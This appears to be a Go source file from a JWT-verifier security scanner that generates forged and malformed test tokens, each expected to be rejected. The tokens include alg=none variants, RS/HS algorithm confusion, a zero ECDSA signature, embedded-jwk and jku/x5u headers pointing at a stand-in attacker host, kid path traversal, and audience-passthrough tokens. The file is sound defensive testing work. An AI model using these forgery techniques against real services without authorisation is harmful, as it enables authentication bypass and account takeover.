package attack

import (
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"strings"
	"time"
)

// GenContext holds what the generators build tokens around: the trusted issuer
// (a TrustedSigner — a local key offline, or the real issuer's MintFunc when
// scanning live), an attacker key for forgeries, and the expected issuer/audience
// /required claims the correct token must carry.
type GenContext struct {
	Trusted        TrustedSigner
	AttackerKey    *rsa.PrivateKey
	Issuer         string
	Audience       string
	RequiredClaims []string
	Now            time.Time
}

func (c GenContext) baseClaims() map[string]any {
	m := map[string]any{
		"iss": c.Issuer,
		"aud": c.Audience,
		"sub": "user-1",
		"iat": c.Now.Unix(),
		"nbf": c.Now.Add(-time.Minute).Unix(),
		"exp": c.Now.Add(time.Hour).Unix(),
	}
	for _, rc := range c.RequiredClaims {
		m[rc] = "read"
	}
	return m
}

func header(alg string, extra map[string]any) map[string]any {
	h := map[string]any{"alg": alg, "typ": "JWT"}
	for k, v := range extra {
		h[k] = v
	}
	return h
}

// Corpus generates the full attack-token corpus for the given context. The
// control and the claim-level attacks are signed by the trusted issuer (so a live
// target's signature check passes and its claim validation is what's exercised);
// forgeries are constructed directly.
func Corpus(c GenContext) ([]Token, error) {
	var out []Token
	var errs []string
	add := func(t Token, err error) {
		if err != nil {
			errs = append(errs, fmt.Sprintf("%s/%s: %v", t.ThreatID, t.Name, err))
			return
		}
		out = append(out, t)
	}

	// forged builds header.payload signed by signer (which may return "" for a
	// deliberately empty/absent signature). Used for tokens whose *header* or
	// *signature* is the attack, so the real issuer key is not involved.
	forged := func(threat, name, why string, self bool, expect Verdict, hdr, claims any,
		signer func(input string) (string, error)) (Token, error) {
		input, err := signingInput(hdr, claims)
		if err != nil {
			return Token{ThreatID: threat, Name: name}, err
		}
		sig, err := signer(input)
		if err != nil {
			return Token{ThreatID: threat, Name: name}, err
		}
		return Token{ThreatID: threat, Name: name, Rationale: why, JWS: assemble(input, sig),
			Expect: expect, SelfContained: self}, nil
	}
	// trusted builds a token validly signed by the real issuer over claims — used
	// for the control and for claim-level attacks (bad claims, good signature).
	trusted := func(threat, name, why string, self bool, expect Verdict, claims map[string]any) (Token, error) {
		tok, err := c.Trusted.Sign(claims)
		if err != nil {
			return Token{ThreatID: threat, Name: name}, err
		}
		return Token{ThreatID: threat, Name: name, Rationale: why, JWS: tok, Expect: expect, SelfContained: self}, nil
	}
	attacker := func(input string) (string, error) { return signRS256(input, c.AttackerKey) }
	emptySig := func(string) (string, error) { return "", nil }

	// --- control -------------------------------------------------------------
	add(trusted("CONTROL", "valid_token", "a correctly-signed token must be accepted", true, Accept, c.baseClaims()))

	// --- signature -----------------------------------------------------------
	add(forged("SIG-01", "alg_none", "alg=none must be rejected", true, Reject,
		header("none", nil), c.baseClaims(), emptySig))
	add(forged("SIG-03", "empty_signature_rs256", "a signing alg with an empty signature must fail", true, Reject,
		header("RS256", nil), c.baseClaims(), emptySig))
	add(tamperedToken(c)) // SIG-02

	// --- algorithm -----------------------------------------------------------
	// ALG-01 RS/HS confusion: sign HS256 with the trusted issuer's PUBLIC key PEM.
	if pubPEM := c.Trusted.PublicKeyPEM(); pubPEM != "" {
		add(forged("ALG-01", "alg_confusion_rs_hs", "an RS-keyed verifier must reject HS256", true, Reject,
			header("HS256", nil), c.baseClaims(),
			func(input string) (string, error) { return signHS256(input, []byte(pubPEM)), nil }))
	}
	// ALG-03 alg case/whitespace variants of "none".
	for _, v := range []string{"None", "NONE", "nOnE", "none "} {
		add(forged("ALG-03", "alg_none_variant_"+strings.TrimSpace(strings.ToLower(v)),
			"alg matching must be exact; variants of none must be rejected", true, Reject,
			header(v, nil), c.baseClaims(), emptySig))
	}
	// ALG-04 psychic signature: ES256 header, all-zero r||s signature.
	add(forged("ALG-04", "psychic_signature_es256", "degenerate ECDSA (0,0) must be rejected", true, Reject,
		header("ES256", nil), c.baseClaims(),
		func(string) (string, error) { return b64.EncodeToString(make([]byte, 64)), nil }))

	// --- header key injection -----------------------------------------------
	if jwk, jerr := jwkJSON(&c.AttackerKey.PublicKey); jerr == nil {
		add(forged("HDR-03", "embedded_jwk", "a key embedded in the token header must not verify that token", true, Reject,
			header("RS256", map[string]any{"jwk": jwk}), c.baseClaims(), attacker))
	} else {
		errs = append(errs, "HDR-03: "+jerr.Error())
	}
	// HDR-01 jku / HDR-02 x5u: NOT self-contained — a vulnerable target fetches the
	// attacker key set from the header URL, which needs Keyway to host it.
	add(forged("HDR-01", "jku_injection", "key material must never come from a token-supplied URL", false, Reject,
		header("RS256", map[string]any{"kid": "attacker", "jku": "https://attacker.keyway.test/jwks.json"}),
		c.baseClaims(), attacker))
	add(forged("HDR-02", "x5u_injection", "the verifier must ignore token-supplied x5u URLs", false, Reject,
		header("RS256", map[string]any{"x5u": "https://attacker.keyway.test/cert.pem"}),
		c.baseClaims(), attacker))
	// HDR-05 kid path traversal → empty key: kid points at /dev/null; HS256 signed
	// with an empty secret.
	add(forged("HDR-05", "kid_path_traversal", "kid must be an opaque lookup key, never a path", true, Reject,
		header("HS256", map[string]any{"kid": "../../../../../../dev/null"}), c.baseClaims(),
		func(input string) (string, error) { return signHS256(input, []byte{}), nil }))

	// --- claims (validly signed, bad claims) --------------------------------
	expired := c.baseClaims()
	expired["exp"] = c.Now.Add(-time.Hour).Unix()
	add(trusted("CLM-01", "expired", "an expired token must be rejected", true, Reject, expired))

	future := c.baseClaims()
	future["nbf"] = c.Now.Add(time.Hour).Unix()
	future["exp"] = c.Now.Add(2 * time.Hour).Unix()
	add(trusted("CLM-02", "not_yet_valid", "a token before its nbf must be rejected", true, Reject, future))

	wrongIss := c.baseClaims()
	wrongIss["iss"] = "https://evil.keyway.test"
	add(trusted("CLM-03", "wrong_issuer", "a token from an unexpected issuer must be rejected", true, Reject, wrongIss))

	wrongAud := c.baseClaims()
	wrongAud["aud"] = "some-other-service"
	add(trusted("CLM-04", "wrong_audience", "a token for another audience must be rejected", true, Reject, wrongAud))

	audArr := c.baseClaims()
	audArr["aud"] = []any{"some-other-service", "and-another"}
	add(trusted("CLM-06", "aud_array_confusion", "array-encoded aud must still be matched, not bypassed", true, Reject, audArr))

	noExp := c.baseClaims()
	delete(noExp, "exp")
	add(trusted("CLM-08", "missing_exp", "a token with no expiry must be rejected where expiry is required", true, Reject, noExp))

	// --- encoding / parsing (valid token, then structurally corrupted) -------
	add(extraSegmentsToken(c)) // ENC-01
	add(nonB64URLToken(c))     // ENC-02

	// --- agent auth: resource / audience binding (live) ---------------------
	// These are validly signed by the trusted issuer, but bound to the wrong
	// resource (or nothing). A correct MCP/agent resource server MUST reject them
	// (RFC 8707/9728) — accepting one is a live token-passthrough vulnerability,
	// the #1 MCP threat. This is the live counterpart of the static analyzer.
	passthrough := c.baseClaims()
	passthrough["aud"] = "https://passthrough.keyway.test/other-resource"
	add(trusted("MCP-01", "resource_passthrough", "a token issued for another resource must be rejected — no passthrough", true, Reject, passthrough))

	unbound := c.baseClaims()
	delete(unbound, "aud")
	add(trusted("MCP-02", "unbound_audience", "a token with no audience is bound to nothing and must be rejected", true, Reject, unbound))

	sibling := c.baseClaims()
	sibling["aud"] = "https://sibling.keyway.test/api"
	add(trusted("DEL-02", "sibling_resource", "a token bound to a sibling hop must not be accepted here — trust is not transitive", true, Reject, sibling))

	if len(errs) > 0 {
		return out, fmt.Errorf("attack: corpus generation errors: %s", strings.Join(errs, "; "))
	}
	return out, nil
}

// tamperedToken signs a valid token then flips its signature, so the signature no
// longer verifies over the (unchanged) payload.
func tamperedToken(c GenContext) (Token, error) {
	t := Token{ThreatID: "SIG-02", Name: "tampered_signature",
		Rationale: "claims must not be trusted unless the signature verifies", Expect: Reject, SelfContained: true}
	valid, err := c.Trusted.Sign(c.baseClaims())
	if err != nil {
		return t, err
	}
	tampered, err := tamperSignature(valid)
	if err != nil {
		return t, err
	}
	t.JWS = tampered
	return t, nil
}

// extraSegmentsToken appends a fourth segment to an otherwise-valid JWS.
func extraSegmentsToken(c GenContext) (Token, error) {
	t := Token{ThreatID: "ENC-01", Name: "extra_segments",
		Rationale: "a JWS must have exactly three segments", Expect: Reject, SelfContained: true}
	valid, err := c.Trusted.Sign(c.baseClaims())
	if err != nil {
		return t, err
	}
	t.JWS = valid + "." + b64.EncodeToString([]byte("extra"))
	return t, nil
}

// nonB64URLToken corrupts a valid token's payload segment with base64 padding
// ('='), which a canonical base64url JWS segment never carries.
func nonB64URLToken(c GenContext) (Token, error) {
	t := Token{ThreatID: "ENC-02", Name: "non_base64url",
		Rationale: "segments must be strict base64url without padding", Expect: Reject, SelfContained: true}
	valid, err := c.Trusted.Sign(c.baseClaims())
	if err != nil {
		return t, err
	}
	parts := strings.Split(valid, ".")
	if len(parts) != 3 {
		return t, fmt.Errorf("attack: trusted signer did not return a compact JWS")
	}
	t.JWS = parts[0] + "." + parts[1] + "=." + parts[2]
	return t, nil
}

func publicKeyPEM(pub *rsa.PublicKey) ([]byte, error) {
	der, err := x509.MarshalPKIXPublicKey(pub)
	if err != nil {
		return nil, err
	}
	return pem.EncodeToMemory(&pem.Block{Type: "PUBLIC KEY", Bytes: der}), nil
}
